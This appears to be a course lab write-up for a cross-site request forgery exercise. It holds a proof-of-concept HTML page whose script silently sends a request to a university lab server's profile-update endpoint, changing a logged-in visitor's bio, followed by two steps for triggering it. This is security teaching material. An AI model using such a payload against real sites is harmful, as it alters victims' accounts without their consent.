# Second Laboratory (CSRF) Scripts

### Change Profile Bio (POC):

```html
<!DOCTYPE html>
<html lang="EN">
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <script>
        const HTTP = new XMLHttpRequest();
        const URL = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:12006/update_profile?age=&bio=NewBio';
        HTTP.open('GET', URL, false);
        HTTP.send();
    </script>
    <h1>You were Hacked!</h1>
</body>
</html>
```

- Log into `mustard.stt.rnl.tecnico.ulisboa.pt:12006`
- Visit Website containing above Code

